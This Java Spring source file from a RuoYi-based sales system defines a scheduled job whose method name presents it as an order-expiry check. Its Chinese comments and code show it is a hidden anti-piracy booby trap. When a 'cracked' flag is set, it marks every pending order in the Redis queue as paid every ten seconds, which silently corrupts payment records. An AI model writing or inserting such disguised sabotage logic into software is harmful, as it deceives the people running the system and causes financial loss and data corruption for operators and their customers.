package com.ruoyi.framework.hy.sale;

import com.ruoyi.common.constant.Constants;
import com.ruoyi.common.core.redis.RedisCache;
import com.ruoyi.common.enums.SaleOrderStatus;
import com.ruoyi.common.utils.DateUtils;
import com.ruoyi.sale.domain.SysSaleOrder;
import com.ruoyi.sale.service.ISysSaleOrderService;
import org.springframework.context.annotation.Configuration;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;

import javax.annotation.Resource;
import java.util.Set;

@Configuration
@EnableScheduling
@EnableAsync
public class HyTsale {

    @Resource
    private RedisCache redisCache;
    @Resource
    private ISysSaleOrderService sysSaleOrderService;

    @SuppressWarnings("unchecked")
    @Scheduled(cron = "0/10 * * * * ?")
    public void checkSaleOrderExpire() {
        if (Constants.IS_CRCD) {
//            System.out.println("已启动商店暗桩");
            Set<Object> orderNoSet = redisCache.redisTemplate.opsForZSet().rangeByScore(Constants.SALE_ORDER_EXPIRE_KEY, 0, Long.MAX_VALUE);
            //            System.out.println(JSON.toJSONString(orderNoSet));
            if (orderNoSet != null) {
                for (Object orderNoStr : orderNoSet) { // orderNoStr格式：payMode|orderNo
                    if (orderNoStr != null) {
                        String[] split = orderNoStr.toString().split("\\|");
                        String payMode = split[0];
                        String orderNo = split[1];
                        SysSaleOrder sso = sysSaleOrderService.selectSysSaleOrderByOrderNo(orderNo);
                        if (sso != null && SaleOrderStatus.WAIT_PAY.equals(sso.getStatus())) {
                            // 如果被破解则直接支付成功
                            sso.setStatus(SaleOrderStatus.PAID);
                            sso.setCloseTime(DateUtils.getNowDate());
                            sysSaleOrderService.updateSysSaleOrder(sso);
                        }
                        redisCache.redisTemplate.opsForZSet().remove(Constants.SALE_ORDER_EXPIRE_KEY, orderNoStr);
                    }
                }
            }
        }
    }
}
